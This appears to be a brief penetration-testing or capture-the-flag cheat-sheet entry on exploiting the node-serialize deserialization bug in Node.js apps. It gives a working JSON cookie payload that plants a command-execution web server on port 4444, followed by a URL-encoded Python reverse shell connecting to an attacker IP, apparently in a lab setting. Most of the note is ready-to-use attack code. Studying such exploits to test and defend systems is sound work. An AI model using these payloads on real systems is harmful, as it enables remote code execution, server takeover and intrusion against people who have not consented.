

### Exploiting node-serialize vulnerability

- check if node-serialize lib is used to serialize any user input values like cookie
  (try it out by giving random special chars to trigger an error)
  
- if its used
https://www.exploit-db.com/exploits/50036
- Started a new webserver to accept commands at port 4444 with param cmd
```json
{"username":"_$$ND_FUNC$$_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(4444); }()","isGuest":false,"encoding": "utf-8"}
```

- python rev shell to the cmd
```
http://10.10.121.157:4444/?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%2210.17.106.162%22,9000));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22sh%22)%27
```


https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/